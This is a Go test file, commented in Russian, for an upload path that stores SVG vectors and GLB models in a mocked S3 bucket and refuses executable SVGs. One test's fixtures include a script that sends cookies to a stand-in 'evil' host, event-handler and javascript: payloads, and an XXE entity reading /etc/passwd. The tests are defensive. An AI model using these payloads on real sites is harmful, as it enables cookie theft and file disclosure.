package bucket

import (
	"bytes"
	"context"
	"encoding/binary"
	"image"
	"image/color"
	"image/gif"
	"image/jpeg"
	"strings"
	"testing"

	"github.com/jekabolt/grbpwr-manager/internal/entity"
	"github.com/jekabolt/grbpwr-manager/internal/recraft"
	"github.com/stretchr/testify/require"
)

// ЧТО ЗДЕСЬ ДОКАЗЫВАЕТСЯ.
//
// Вектор и модель хранятся ВЕРБАТИМ и отдаются потом с нашего собственного публичного хоста. У
// этого две стороны, и обе проверяются здесь одним и тем же способом — через настоящий путь
// загрузки к подставному S3, а не через внутренний хелпер:
//
//  1. SVG — ИСПОЛНЯЕМЫЙ ДОКУМЕНТ. В браузере администратора <script>, on*-атрибут, javascript:-ссылка
//     и объявленная XML-сущность работают. Поэтому ни один байт не должен уехать в бакет раньше,
//     чем recraft.InspectSVG сказал «чисто». Пробы ниже — это то, что краснеет поимённо, если
//     проверку убрать: они утверждают не только отказ, но и ПУСТОЙ бакет (store.puts == 0).
//  2. ТИП, КОТОРОМУ ПОДЧИНЯЕТСЯ БРАУЗЕР. Объект кладётся с content-type и расширением: модель,
//     отданная как application/octet-stream, — это скачивание, а не то, что откроет вьюер.

// cleanSVG — простейший законный вектор с явными размерами.
const cleanSVG = `<svg xmlns="http://www.w3.org/2000/svg" width="32" height="24" viewBox="0 0 64 48">` +
	`<path d="M4 4 C 12 4, 20 12, 28 20 L 4 20 Z" fill="none" stroke="#000"/></svg>`

// makeGLB builds a minimal, well-formed glTF binary: the 12-byte header plus one JSON chunk, with
// the header's length field equal to the real size — which is the thing checkGLB reads.
func makeGLB(t *testing.T) []byte {
	t.Helper()
	body := []byte(`{"asset":{"version":"2.0"}}`)
	for len(body)%4 != 0 {
		body = append(body, ' ')
	}
	out := make([]byte, 0, 12+8+len(body))
	out = append(out, 'g', 'l', 'T', 'F')
	out = binary.LittleEndian.AppendUint32(out, 2)
	out = binary.LittleEndian.AppendUint32(out, uint32(12+8+len(body)))
	out = binary.LittleEndian.AppendUint32(out, uint32(len(body)))
	out = append(out, 'J', 'S', 'O', 'N')
	out = append(out, body...)
	return out
}

// TestSVGIsStoredVerbatimUnderItsOwnType walks the whole path: bytes in, object out, row written.
func TestSVGIsStoredVerbatimUnderItsOwnType(t *testing.T) {
	ctx := context.Background()
	b, store, ms := newProbeBucket(t)

	var row *entity.MediaItem
	captureAddMedia(ms, &row)

	raw := []byte(cleanSVG)
	got, err := b.UploadContentNonRaster(ctx, raw, "image/svg+xml", "design", "probe-vec")
	require.NoError(t, err)
	require.NotNil(t, got)
	require.NotNil(t, row)

	stored := store.storedUnder(t, "probe-vec-og")
	require.Equal(t, raw, stored, "a vector must reach the bucket byte-for-byte: it is not re-encoded")
	require.Equal(t, 1, store.puts, "one object, not three variants: there is no raster to derive")

	// Тип и расширение — это ровно то, чем браузер и читатели узнают, что это вектор: колонки
	// content-type в media нет и никогда не было.
	require.Equal(t, "image/svg+xml", store.storedTypeUnder(t, "probe-vec-og"))
	require.True(t, strings.HasSuffix(store.storedKeyUnder(t, "probe-vec-og"), ".svg"),
		"the object key must carry the .svg extension")

	// Одна строка media, у которой все три слота ведут на этот объект — форма, которую уже
	// понимают все существующие читатели (её же пишет путь видео).
	require.Equal(t, row.FullSizeMediaURL, row.CompressedMediaURL)
	require.Equal(t, row.FullSizeMediaURL, row.ThumbnailMediaURL)
	require.True(t, strings.HasSuffix(row.FullSizeMediaURL, ".svg"), row.FullSizeMediaURL)
	require.Equal(t, sha256Hex(stored), row.ContentHash.String,
		"content_hash must be the sha of the object as stored")
	require.False(t, row.BlurHash.Valid, "there is no raster to average: NULL, not an empty string")

	// Размеры взяты у корня документа, а не выдуманы.
	require.Equal(t, 32, row.FullSizeWidth)
	require.Equal(t, 24, row.FullSizeHeight)
	require.Equal(t, 32, row.ThumbnailWidth)
}

// TestGLBIsStoredAsAModelTheBrowserCanOpen. Тип обязателен: модель, отданная октет-стримом, — это
// файл на скачивание, а не то, что откроется во вьюере.
func TestGLBIsStoredAsAModelTheBrowserCanOpen(t *testing.T) {
	ctx := context.Background()
	b, store, ms := newProbeBucket(t)

	var row *entity.MediaItem
	captureAddMedia(ms, &row)

	raw := makeGLB(t)
	_, err := b.UploadContentNonRaster(ctx, raw, "model/gltf-binary", "design", "probe-mdl")
	require.NoError(t, err)
	require.NotNil(t, row)

	require.Equal(t, raw, store.storedUnder(t, "probe-mdl-og"))
	require.Equal(t, "model/gltf-binary", store.storedTypeUnder(t, "probe-mdl-og"))
	require.True(t, strings.HasSuffix(store.storedKeyUnder(t, "probe-mdl-og"), ".glb"))
	require.Equal(t, row.FullSizeMediaURL, row.ThumbnailMediaURL)
	// У модели нет пиксельных размеров, и ноль — честный ответ, ровно как у видео.
	require.Zero(t, row.FullSizeWidth)
	require.Zero(t, row.FullSizeHeight)
}

// TestAnExecutableSVGNeverReachesTheBucket — ГЛАВНАЯ ПРОБА ЭТОГО ФАЙЛА.
//
// Каждый случай — законный XML, который браузер выполнит. Проба утверждает ДВЕ вещи: отказ и то,
// что в бакет не уехало НИ ОДНОГО объекта. Второе важнее первого: объект уже публичен в момент,
// когда PutObject вернулся, и «удалим потом» ничего не отменяет — ссылку могли открыть.
//
// ⚠ Уберите вызов recraft.InspectSVG из UploadContentNonRaster — и этот тест покраснеет поимённо,
// по одному подтесту на каждый способ исполнить код с нашего домена.
func TestAnExecutableSVGNeverReachesTheBucket(t *testing.T) {
	cases := map[string]string{
		"script element": `<svg xmlns="http://www.w3.org/2000/svg"><script>fetch("//evil/"+document.cookie)</script></svg>`,
		"event handler":  `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><rect width="1" height="1"/></svg>`,
		"javascript url": `<svg xmlns="http://www.w3.org/2000/svg"><a href="javascript:alert(1)"><rect width="1" height="1"/></a></svg>`,
		"declared entity": `<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` +
			`<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>`,
		"foreign object": `<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><body xmlns="http://www.w3.org/1999/xhtml">` +
			`<img src=x onerror="alert(1)"/></body></foreignObject></svg>`,
	}
	for name, svg := range cases {
		t.Run(name, func(t *testing.T) {
			// Никаких ожиданий на media store: любой вызов AddMedia провалит этот тест по имени.
			b, store, _ := newProbeBucket(t)
			_, err := b.UploadContentNonRaster(context.Background(), []byte(svg),
				"image/svg+xml", "design", "probe-evil")
			require.Error(t, err, "an SVG that can execute must be refused")
			require.ErrorIs(t, err, ErrInvalidNonRaster)
			require.Zero(t, store.puts, "nothing may reach the bucket: the object is public the "+
				"instant it lands, and taking it back afterwards un-serves nothing")
		})
	}
}

// TestARasterUnderAVectorNameIsRefused. Растр, приехавший под именем вектора, — это признак того,
// что в вектор-маршруте настроена РАСТРОВАЯ модель; сохранить его значило бы тихо отменить всё
// требование «ровный вектор».
func TestARasterUnderAVectorNameIsRefused(t *testing.T) {
	b, store, _ := newProbeBucket(t)
	png := makePNG(t, 4, 4)
	_, err := b.UploadContentNonRaster(context.Background(), png, "image/svg+xml", "design", "probe-png")
	require.ErrorIs(t, err, ErrInvalidNonRaster)
	require.Contains(t, err.Error(), "PNG")
	require.Zero(t, store.puts)
}

// TestNonRasterCeilingsRefuseRatherThanTruncate. Обрезанный по границе файл выглядит как успешная
// загрузка и открывается ничем.
func TestNonRasterCeilingsRefuseRatherThanTruncate(t *testing.T) {
	ctx := context.Background()

	t.Run("vector", func(t *testing.T) {
		b, store, _ := newProbeBucket(t)
		huge := []byte(`<svg xmlns="http://www.w3.org/2000/svg">` +
			strings.Repeat("<rect width='1' height='1'/>", 1) + strings.Repeat(" ", maxVectorPayloadBytes) + `</svg>`)
		require.Greater(t, len(huge), maxVectorPayloadBytes)
		_, err := b.UploadContentNonRaster(ctx, huge, "image/svg+xml", "design", "probe-big")
		require.ErrorIs(t, err, ErrInvalidNonRaster)
		require.Contains(t, err.Error(), "too large")
		require.Zero(t, store.puts, "an oversized payload must be refused, never stored as a prefix")
	})

	t.Run("model", func(t *testing.T) {
		b, store, _ := newProbeBucket(t)
		huge := make([]byte, maxModelPayloadBytes+1)
		copy(huge, makeGLB(t))
		_, err := b.UploadContentNonRaster(ctx, huge, "model/gltf-binary", "design", "probe-big")
		require.ErrorIs(t, err, ErrInvalidNonRaster)
		require.Contains(t, err.Error(), "too large")
		require.Zero(t, store.puts)
	})
}

// TestNonRasterRefusesEverythingItHasNoPathFor. Путь не «на всё остальное» — он на два типа.
func TestNonRasterRefusesEverythingItHasNoPathFor(t *testing.T) {
	ctx := context.Background()
	for _, ct := range []string{"image/png", "application/pdf", "video/mp4", "text/html", ""} {
		b, store, _ := newProbeBucket(t)
		_, err := b.UploadContentNonRaster(ctx, []byte("whatever"), ct, "design", "probe")
		require.ErrorIsf(t, err, ErrInvalidNonRaster, "content type %q", ct)
		require.Zero(t, store.puts)
	}
	b, store, _ := newProbeBucket(t)
	_, err := b.UploadContentNonRaster(ctx, nil, "image/svg+xml", "design", "probe")
	require.ErrorIs(t, err, ErrInvalidNonRaster)
	require.Zero(t, store.puts)
}

// TestGLBHeaderCatchesATruncatedDownload. Заголовок объявляет ПОЛНЫЙ размер контейнера, поэтому
// «объявлено больше, чем приехало» — это оборванная закачка, а не странный экспортёр.
func TestGLBHeaderCatchesATruncatedDownload(t *testing.T) {
	good := makeGLB(t)
	require.NoError(t, checkGLB(good))

	truncated := append([]byte(nil), good...)
	truncated = truncated[:len(truncated)-4]
	require.Error(t, checkGLB(truncated), "a model whose header promises more bytes than arrived is broken")
	require.Contains(t, checkGLB(truncated).Error(), "truncated")

	// Лишний хвост после полного контейнера — чужая неаккуратность, а не сломанная модель: отказ
	// здесь провалил бы УЖЕ ОПЛАЧЕННЫЙ прогон.
	padded := append(append([]byte(nil), good...), 0x00, 0x00, 0x00, 0x00)
	require.NoError(t, checkGLB(padded))

	require.Error(t, checkGLB([]byte("not a model at all")))
	require.Error(t, checkGLB(good[:8]))

	v1 := append([]byte(nil), good...)
	binary.LittleEndian.PutUint32(v1[4:8], 1)
	require.Error(t, checkGLB(v1), "glTF 1.0 binary is a different format")
}

// TestSVGSizeIsWhatTheDocumentSaysOrNothing. Выдуманный размер тихо перекосил бы каждый экран,
// который ему верит; ноль — честное «неизвестно».
func TestSVGSizeIsWhatTheDocumentSaysOrNothing(t *testing.T) {
	size := func(t *testing.T, svg string) (int, int) {
		t.Helper()
		stats, err := inspectForTest(svg)
		require.NoError(t, err)
		return svgPixelSize(stats)
	}
	w, h := size(t, `<svg xmlns="http://www.w3.org/2000/svg" width="120" height="80"></svg>`)
	require.Equal(t, [2]int{120, 80}, [2]int{w, h})

	w, h = size(t, `<svg xmlns="http://www.w3.org/2000/svg" width="120px" height="80px"></svg>`)
	require.Equal(t, [2]int{120, 80}, [2]int{w, h})

	// Проценты — утверждение о контейнере, а не о картинке: тогда читается viewBox.
	w, h = size(t, `<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 64 48"></svg>`)
	require.Equal(t, [2]int{64, 48}, [2]int{w, h})

	w, h = size(t, `<svg xmlns="http://www.w3.org/2000/svg"></svg>`)
	require.Equal(t, [2]int{0, 0}, [2]int{w, h})

	// Заявленный размер больше растрового потолка читается как «неизвестно», а не как число,
	// которому кто-то поверит.
	w, h = size(t, `<svg xmlns="http://www.w3.org/2000/svg" width="999999" height="999999"></svg>`)
	require.Equal(t, [2]int{0, 0}, [2]int{w, h})
}

// TestCanStoreMediaTypeIsTheOneAnswerBothPathsGive — связь, а не список: каждый тип, о котором
// пакет говорит «умею», обязан пройти НАСТОЯЩИЙ путь загрузки, а не быть строкой в таблице.
func TestCanStoreMediaTypeIsTheOneAnswerBothPathsGive(t *testing.T) {
	ctx := context.Background()
	for _, ct := range StorableMediaTypes() {
		t.Run(ct, func(t *testing.T) {
			b, store, ms := newProbeBucket(t)
			var row *entity.MediaItem
			captureAddMedia(ms, &row)

			var err error
			switch ContentType(ct) {
			case contentTypeSVG:
				_, err = b.UploadContentNonRaster(ctx, []byte(cleanSVG), ct, "design", "probe-"+strings.NewReplacer("/", "-", "+", "-").Replace(ct))
			case contentTypeGLB:
				_, err = b.UploadContentNonRaster(ctx, makeGLB(t), ct, "design", "probe-glb")
			default:
				_, err = b.UploadContentImageVerbatim(ctx, makeRasterOfType(t, ContentType(ct)), "design", "probe-raster")
			}
			require.NoErrorf(t, err, "%s is advertised as storable and must actually store", ct)
			require.NotNil(t, row, "a storable type must end as a media row")
			require.NotZero(t, store.puts)
		})
	}
	for _, ct := range []string{"application/pdf", "image/heic", "video/mp4", "", "text/html"} {
		require.Falsef(t, CanStoreMediaType(ct), "%q has no media storage path here", ct)
	}
	require.True(t, CanStoreMediaType("IMAGE/SVG+XML; charset=utf-8"),
		"casing and parameters are cosmetic, not a different type")
}

// inspectForTest is the same check the storage path runs, called directly so the size probe reads
// what the document said rather than a value this test wrote down itself.
func inspectForTest(svg string) (recraft.SVGStats, error) {
	return recraft.InspectSVG([]byte(svg))
}

// makeRasterOfType builds a small real picture in one of the raster types the package advertises.
// Real bytes, not a magic-number stub: the verbatim path sniffs AND decodes them.
func makeRasterOfType(t *testing.T, ct ContentType) []byte {
	t.Helper()
	img := image.NewRGBA(image.Rect(0, 0, 8, 6))
	for y := 0; y < 6; y++ {
		for x := 0; x < 8; x++ {
			img.Set(x, y, color.RGBA{R: uint8(x * 30), G: uint8(y * 40), B: 0x20, A: 0xFF})
		}
	}
	var buf bytes.Buffer
	switch ct {
	case contentTypePNG:
		return makePNG(t, 8, 6)
	case contentTypeJPEG:
		require.NoError(t, jpeg.Encode(&buf, img, nil))
	case contentTypeGIF:
		require.NoError(t, gif.Encode(&buf, img, nil))
	case contentTypeWEBP:
		require.NoError(t, encodeWEBP(&buf, img, 90))
	default:
		t.Fatalf("no raster fixture for %s", ct)
	}
	return buf.Bytes()
}
